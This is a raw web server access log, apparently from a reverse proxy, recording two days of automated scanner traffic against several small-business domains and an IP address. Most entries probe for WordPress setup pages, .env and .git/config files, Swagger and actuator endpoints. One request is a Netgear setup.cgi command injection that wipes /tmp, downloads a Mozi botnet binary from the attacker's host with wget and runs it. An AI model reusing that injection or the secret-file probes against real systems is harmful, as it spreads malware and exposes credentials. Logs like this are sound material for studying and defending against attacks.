[25/Nov/2025:19:34:06 +0000] 404 - GET http bhbuilders.org "/wordpress/wp-admin/setup-config.php" [Client 162.158.95.184] [Length 183] [Gzip 3.21] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36" "-"
[25/Nov/2025:19:36:23 +0000] 200 - GET http bhbuilders.org "/" [Client 49.205.47.234] [Length 568] [Gzip 1.86] "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 OPR/89.0.4447.51" "-"
[25/Nov/2025:19:49:57 +0000] 404 - GET http bhbuilders.org "/wp-admin/setup-config.php" [Client 172.70.163.96] [Length 183] [Gzip 3.21] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36" "-"
[25/Nov/2025:19:50:55 +0000] 404 - GET http bhbuilders.org "/wordpress/wp-admin/setup-config.php" [Client 172.69.224.177] [Length 183] [Gzip 3.21] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36" "-"
[25/Nov/2025:20:01:53 +0000] 404 - GET http localhost-nginx-proxy-manager "/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://117.244.78.8:45698/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1" [Client 117.244.78.8] [Length 150] [Gzip -] "-" "-"
[25/Nov/2025:20:04:46 +0000] 404 - GET http 64.225.63.240 "/sitecore/shell/sitecore.version.xml" [Client 45.156.128.45] [Length 183] [Gzip 3.21] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36" "-"
[25/Nov/2025:20:09:57 +0000] 200 - GET http 64.225.63.240 "/" [Client 5.187.35.21] [Length 1033] [Gzip -] "-" "-"
[25/Nov/2025:20:10:00 +0000] 200 - GET http 64.225.63.240 "/" [Client 204.76.203.212] [Length 568] [Gzip 1.86] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
[25/Nov/2025:20:12:15 +0000] 404 - GET http bhbuilders.org "/wp-admin/setup-config.php" [Client 172.69.224.177] [Length 183] [Gzip 3.21] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36" "-"
[25/Nov/2025:20:13:48 +0000] 404 - GET http bhbuilders.org "/wordpress/wp-admin/setup-config.php" [Client 172.68.229.26] [Length 183] [Gzip 3.21] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36" "-"
[25/Nov/2025:20:37:26 +0000] 404 - GET http bhbuilders.org "/wp-admin/setup-config.php" [Client 104.23.217.136] [Length 183] [Gzip 3.21] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36" "-"
[25/Nov/2025:20:38:31 +0000] 404 - GET http bhbuilders.org "/wordpress/wp-admin/setup-config.php" [Client 104.23.217.137] [Length 183] [Gzip 3.21] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36" "-"
[25/Nov/2025:20:39:11 +0000] 200 - GET http bhbuilders.org "/" [Client 37.113.40.36] [Length 568] [Gzip 1.86] "Python/3.13 aiohttp/3.13.2" "-"
[25/Nov/2025:20:48:16 +0000] 200 - GET http 64.225.63.240 "/" [Client 5.187.35.21] [Length 1033] [Gzip -] "-" "-"
[25/Nov/2025:20:54:42 +0000] 400 - - http localhost-nginx-proxy-manager "-" [Client 169.228.66.212] [Length 154] [Gzip -] "-" "-"
[25/Nov/2025:20:59:52 +0000] 404 - GET http bhbuilders.org "/wordpress/wp-admin/setup-config.php" [Client 172.70.163.96] [Length 183] [Gzip 3.21] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36" "-"
[25/Nov/2025:20:59:57 +0000] 404 - GET http bhbuilders.org "/wp-admin/setup-config.php" [Client 172.69.195.223] [Length 183] [Gzip 3.21] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36" "-"
[25/Nov/2025:21:09:34 +0000] 200 - GET http bhbuilders.org "/" [Client 117.33.163.216] [Length 568] [Gzip 1.86] "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
[25/Nov/2025:21:13:26 +0000] 404 - GET http swifthvacandrefrigeration.com "/.env.example" [Client 193.32.162.16] [Length 150] [Gzip -] "-" "-"
[25/Nov/2025:21:16:00 +0000] 400 - GET http 64.225.63.240 "/" [Client 66.132.153.134] [Length 252] [Gzip -] "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)" "-"
[25/Nov/2025:21:16:00 +0000] 400 - - http localhost "-" [Client 66.132.153.134] [Length 154] [Gzip -] "-" "-"
[25/Nov/2025:21:16:05 +0000] 400 - GET http 64.225.63.240 "/.well-known/security.txt" [Client 66.132.153.134] [Length 252] [Gzip -] "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)" "-"
[25/Nov/2025:21:18:26 +0000] 404 - GET http bhbuilders.org "/wp-admin/setup-config.php" [Client 172.70.163.96] [Length 183] [Gzip 3.21] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36" "-"
[25/Nov/2025:21:20:33 +0000] 404 - GET http bhbuilders.org "/wordpress/wp-admin/setup-config.php" [Client 141.101.98.150] [Length 183] [Gzip 3.21] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36" "-"
[25/Nov/2025:21:30:27 +0000] 200 - GET http 64.225.63.240 "/" [Client 204.76.203.212] [Length 568] [Gzip 1.86] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
[25/Nov/2025:21:39:57 +0000] 404 - GET http bhbuilders.org "/wp-admin/setup-config.php" [Client 162.158.111.163] [Length 183] [Gzip 3.21] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36" "-"
[25/Nov/2025:21:40:15 +0000] 200 - GET http bhbuilders.org "/.well-known/acme-challenge/test-challenge" [Client 136.143.178.51] [Length 7] [Gzip -] "Site24x7-Tools" "-"
[25/Nov/2025:21:40:15 +0000] 200 - GET http bhbuilders.org "/.well-known/acme-challenge/test-challenge" [Client 192.81.129.136] [Length 7] [Gzip -] "None, Site24x7" "-"
[25/Nov/2025:22:38:58 +0000] 200 - GET http 64.225.63.240 "/" [Client 5.187.35.21] [Length 1033] [Gzip -] "-" "-"
[25/Nov/2025:22:49:15 +0000] 400 - - http localhost-nginx-proxy-manager "-" [Client 35.196.43.99] [Length 0] [Gzip -] "-" "-"
[25/Nov/2025:22:59:33 +0000] 200 - GET http 64.225.63.240 "/" [Client 204.76.203.212] [Length 568] [Gzip 1.86] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
[26/Nov/2025:15:30:55 +0000] 200 - GET http 64.225.63.240 "/" [Client 5.187.35.21] [Length 1033] [Gzip -] "-" "-"
[26/Nov/2025:15:30:56 +0000] 304 - GET http 64.225.63.240 "/" [Client 24.198.68.170] [Length 0] [Gzip -] "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36" "-"
[26/Nov/2025:15:32:03 +0000] 400 - GET http 64.225.63.240 "/" [Client 43.157.53.115] [Length 252] [Gzip -] "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
[26/Nov/2025:15:33:02 +0000] 400 - - http localhost-nginx-proxy-manager "-" [Client 212.102.61.139] [Length 0] [Gzip -] "-" "-"
[26/Nov/2025:15:35:56 +0000] 400 - - http localhost "-" [Client 209.38.201.154] [Length 154] [Gzip -] "-" "-"
[26/Nov/2025:15:40:26 +0000] 400 - - http localhost-nginx-proxy-manager "-" [Client 209.38.201.154] [Length 154] [Gzip -] "-" "-"
[26/Nov/2025:15:46:30 +0000] 400 - - http localhost-nginx-proxy-manager "-" [Client 172.105.128.11] [Length 154] [Gzip -] "-" "-"
[26/Nov/2025:15:46:31 +0000] 400 - - http localhost-nginx-proxy-manager "-" [Client 172.105.128.11] [Length 154] [Gzip -] "-" "-"
[26/Nov/2025:15:48:02 +0000] 404 - GET http swifthvacandrefrigeration.com "/userfuns.php" [Client 4.232.179.163] [Length 183] [Gzip 3.21] "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36" "www.google.com"
[26/Nov/2025:16:08:22 +0000] 200 - GET http 64.225.63.240 "/" [Client 204.76.203.212] [Length 568] [Gzip 1.86] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
[26/Nov/2025:16:09:38 +0000] 404 - GET http 64.225.63.240 "/cgi-bin/luci/;stok=/locale" [Client 193.142.147.209] [Length 150] [Gzip -] "-" "-"
[26/Nov/2025:16:11:57 +0000] 400 - GET http 64.225.63.240 "/" [Client 124.198.132.121] [Length 252] [Gzip -] "-" "-"
[26/Nov/2025:16:24:32 +0000] 400 - - http localhost-nginx-proxy-manager "-" [Client 134.122.28.88] [Length 154] [Gzip -] "-" "-"
[26/Nov/2025:16:24:32 +0000] 200 - GET http www.bhbuilders.org "/" [Client 134.122.28.88] [Length 1033] [Gzip -] "-" "-"
[26/Nov/2025:16:24:32 +0000] 200 - GET http www.bhbuilders.org "/" [Client 134.122.28.88] [Length 1033] [Gzip -] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:32 +0000] 404 - POST http www.bhbuilders.org "/graphql" [Client 134.122.28.88] [Length 122] [Gzip 1.35] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:32 +0000] 404 - POST http www.bhbuilders.org "/api" [Client 134.122.28.88] [Length 122] [Gzip 1.35] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:32 +0000] 404 - POST http www.bhbuilders.org "/api/graphql" [Client 134.122.28.88] [Length 122] [Gzip 1.35] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:32 +0000] 404 - POST http www.bhbuilders.org "/graphql/api" [Client 134.122.28.88] [Length 122] [Gzip 1.35] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:32 +0000] 404 - POST http www.bhbuilders.org "/api/gql" [Client 134.122.28.88] [Length 122] [Gzip 1.35] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:32 +0000] 404 - GET http www.bhbuilders.org "/swagger-ui.html" [Client 134.122.28.88] [Length 122] [Gzip 1.35] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:32 +0000] 404 - GET http www.bhbuilders.org "/swagger/index.html" [Client 134.122.28.88] [Length 122] [Gzip 1.35] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:32 +0000] 404 - GET http www.bhbuilders.org "/swagger/swagger-ui.html" [Client 134.122.28.88] [Length 122] [Gzip 1.35] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:32 +0000] 404 - GET http www.bhbuilders.org "/webjars/swagger-ui/index.html" [Client 134.122.28.88] [Length 122] [Gzip 1.35] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:32 +0000] 404 - GET http www.bhbuilders.org "/swagger.json" [Client 134.122.28.88] [Length 122] [Gzip 1.35] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:32 +0000] 404 - GET http www.bhbuilders.org "/swagger/v1/swagger.json" [Client 134.122.28.88] [Length 122] [Gzip 1.35] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:32 +0000] 404 - GET http www.bhbuilders.org "/v2/api-docs" [Client 134.122.28.88] [Length 122] [Gzip 1.35] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:32 +0000] 404 - GET http www.bhbuilders.org "/v3/api-docs" [Client 134.122.28.88] [Length 122] [Gzip 1.35] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:32 +0000] 404 - GET http www.bhbuilders.org "/api-docs/swagger.json" [Client 134.122.28.88] [Length 122] [Gzip 1.35] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:32 +0000] 404 - GET http www.bhbuilders.org "/api/swagger.json" [Client 134.122.28.88] [Length 122] [Gzip 1.35] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:32 +0000] 404 - GET http www.bhbuilders.org "/@vite/env" [Client 134.122.28.88] [Length 122] [Gzip 1.35] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:32 +0000] 404 - GET http www.bhbuilders.org "/actuator/env" [Client 134.122.28.88] [Length 122] [Gzip 1.35] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:32 +0000] 404 - GET http www.bhbuilders.org "/server" [Client 134.122.28.88] [Length 122] [Gzip 1.35] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:32 +0000] 404 - GET http www.bhbuilders.org "/.vscode/sftp.json" [Client 134.122.28.88] [Length 122] [Gzip 1.35] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:32 +0000] 404 - GET http www.bhbuilders.org "/about" [Client 134.122.28.88] [Length 122] [Gzip 1.35] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:32 +0000] 404 - GET http www.bhbuilders.org "/debug/default/view?panel=config" [Client 134.122.28.88] [Length 122] [Gzip 1.35] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:32 +0000] 404 - GET http www.bhbuilders.org "/v2/_catalog" [Client 134.122.28.88] [Length 122] [Gzip 1.35] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:32 +0000] 404 - GET http www.bhbuilders.org "/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application" [Client 134.122.28.88] [Length 122] [Gzip 1.35] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:32 +0000] 404 - GET http www.bhbuilders.org "/server-status" [Client 134.122.28.88] [Length 122] [Gzip 1.35] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:32 +0000] 404 - GET http www.bhbuilders.org "/login.action" [Client 134.122.28.88] [Length 122] [Gzip 1.35] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:32 +0000] 404 - GET http www.bhbuilders.org "/_all_dbs" [Client 134.122.28.88] [Length 122] [Gzip 1.35] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:32 +0000] 404 - GET http www.bhbuilders.org "/.DS_Store" [Client 134.122.28.88] [Length 122] [Gzip 1.35] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:32 +0000] 404 - GET http www.bhbuilders.org "/.env" [Client 134.122.28.88] [Length 122] [Gzip 1.35] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:32 +0000] 404 - GET http www.bhbuilders.org "/.git/config" [Client 134.122.28.88] [Length 122] [Gzip 1.35] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:32 +0000] 404 - GET http www.bhbuilders.org "/s/034323e23363e2532323e24363/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties" [Client 134.122.28.88] [Length 122] [Gzip 1.35] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:32 +0000] 404 - GET http www.bhbuilders.org "/config.json" [Client 134.122.28.88] [Length 122] [Gzip 1.35] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:32 +0000] 404 - GET http www.bhbuilders.org "/telescope/requests" [Client 134.122.28.88] [Length 122] [Gzip 1.35] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:32 +0000] 404 - GET http www.bhbuilders.org "/info.php" [Client 134.122.28.88] [Length 122] [Gzip 1.35] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:32 +0000] 200 - GET http www.bhbuilders.org "/?rest_route=/wp/v2/users/" [Client 134.122.28.88] [Length 568] [Gzip 1.86] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:33 +0000] 400 - GET http www.bhbuilders.org "/" [Client 139.59.231.238] [Length 252] [Gzip -] "-" "-"
[26/Nov/2025:16:24:34 +0000] 400 - GET http www.bhbuilders.org "/" [Client 139.59.231.238] [Length 252] [Gzip -] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:34 +0000] 400 - POST http www.bhbuilders.org "/graphql" [Client 139.59.231.238] [Length 252] [Gzip -] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:35 +0000] 400 - POST http www.bhbuilders.org "/api" [Client 139.59.231.238] [Length 252] [Gzip -] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:35 +0000] 400 - POST http www.bhbuilders.org "/api/graphql" [Client 139.59.231.238] [Length 252] [Gzip -] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:36 +0000] 400 - POST http www.bhbuilders.org "/graphql/api" [Client 139.59.231.238] [Length 252] [Gzip -] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:36 +0000] 400 - POST http www.bhbuilders.org "/api/gql" [Client 139.59.231.238] [Length 252] [Gzip -] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:36 +0000] 400 - GET http www.bhbuilders.org "/swagger-ui.html" [Client 139.59.231.238] [Length 252] [Gzip -] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:37 +0000] 400 - GET http www.bhbuilders.org "/swagger/index.html" [Client 139.59.231.238] [Length 252] [Gzip -] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:37 +0000] 400 - GET http www.bhbuilders.org "/swagger/swagger-ui.html" [Client 139.59.231.238] [Length 252] [Gzip -] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:38 +0000] 400 - GET http www.bhbuilders.org "/webjars/swagger-ui/index.html" [Client 139.59.231.238] [Length 252] [Gzip -] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:38 +0000] 400 - GET http www.bhbuilders.org "/swagger.json" [Client 139.59.231.238] [Length 252] [Gzip -] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:39 +0000] 400 - GET http www.bhbuilders.org "/swagger/v1/swagger.json" [Client 139.59.231.238] [Length 252] [Gzip -] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:39 +0000] 400 - GET http www.bhbuilders.org "/v2/api-docs" [Client 139.59.231.238] [Length 252] [Gzip -] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:40 +0000] 400 - GET http www.bhbuilders.org "/v3/api-docs" [Client 139.59.231.238] [Length 252] [Gzip -] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:40 +0000] 400 - GET http www.bhbuilders.org "/api-docs/swagger.json" [Client 139.59.231.238] [Length 252] [Gzip -] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:41 +0000] 400 - GET http www.bhbuilders.org "/api/swagger.json" [Client 139.59.231.238] [Length 252] [Gzip -] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:41 +0000] 400 - GET http www.bhbuilders.org "/@vite/env" [Client 139.59.231.238] [Length 252] [Gzip -] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:42 +0000] 400 - GET http www.bhbuilders.org "/actuator/env" [Client 139.59.231.238] [Length 252] [Gzip -] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:42 +0000] 400 - GET http www.bhbuilders.org "/server" [Client 139.59.231.238] [Length 252] [Gzip -] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:43 +0000] 400 - GET http www.bhbuilders.org "/.vscode/sftp.json" [Client 139.59.231.238] [Length 252] [Gzip -] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:43 +0000] 400 - GET http www.bhbuilders.org "/about" [Client 139.59.231.238] [Length 252] [Gzip -] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:44 +0000] 400 - GET http www.bhbuilders.org "/debug/default/view?panel=config" [Client 139.59.231.238] [Length 252] [Gzip -] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:44 +0000] 400 - GET http www.bhbuilders.org "/v2/_catalog" [Client 139.59.231.238] [Length 252] [Gzip -] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:45 +0000] 400 - GET http www.bhbuilders.org "/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application" [Client 139.59.231.238] [Length 252] [Gzip -] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:45 +0000] 400 - GET http www.bhbuilders.org "/server-status" [Client 139.59.231.238] [Length 252] [Gzip -] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:46 +0000] 400 - GET http www.bhbuilders.org "/login.action" [Client 139.59.231.238] [Length 252] [Gzip -] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:46 +0000] 400 - GET http www.bhbuilders.org "/_all_dbs" [Client 139.59.231.238] [Length 252] [Gzip -] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:47 +0000] 400 - GET http www.bhbuilders.org "/.DS_Store" [Client 139.59.231.238] [Length 252] [Gzip -] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:47 +0000] 400 - GET http www.bhbuilders.org "/.env" [Client 139.59.231.238] [Length 252] [Gzip -] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:48 +0000] 400 - GET http www.bhbuilders.org "/.git/config" [Client 139.59.231.238] [Length 252] [Gzip -] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:48 +0000] 400 - GET http www.bhbuilders.org "/s/034323e23363e2532323e24363/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties" [Client 139.59.231.238] [Length 252] [Gzip -] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:49 +0000] 400 - GET http www.bhbuilders.org "/config.json" [Client 139.59.231.238] [Length 252] [Gzip -] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
[26/Nov/2025:16:24:49 +0000] 400 - GET http www.bhbuilders.org "/telescope/requests" [Client 139.59.231.238] [Length 252] [Gzip -] "Mozilla/5.0 (l9scan/2.0.034323e23363e2532323e24363; +https://leakix.net)" "-"
